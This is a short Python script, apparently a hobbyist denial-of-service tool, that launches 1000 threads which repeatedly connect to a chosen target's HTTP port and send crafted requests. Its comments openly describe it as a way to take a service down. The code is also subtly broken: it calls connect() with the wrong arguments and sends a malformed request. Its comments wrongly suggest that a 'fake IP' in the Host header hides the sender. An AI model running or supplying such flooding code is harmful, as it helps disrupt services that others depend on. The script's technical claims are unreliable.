import threading
import socket

# domain or IP address of your target
target = 'put your domain or IP Address of your target hier'

# find the port of the service you want to take down and do DDOS
# port 80 is for http service
port = 80

# f_ip is as example of fake IP to use. It doesn't mean that you won't be recognized
# for such a purpose you need other anonymous programs
f_ip = '140.156.12.233'

# the attack function
# in this function we repeat the process of connecting, sending, closing

def attack():
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(target,port)
        sock.sendto(('GET /' + target + "HTTP/1.1\n\r").encode('ascii'), (target, port))
        sock.sendto(('HOST: '+ f_ip + '\r\n').encode('ascii'), (target, port))
        sock.close()


# now we can do this process in multiple thread
for i in range(1000):
    th = threading.Thread(target=attack)
    th.start()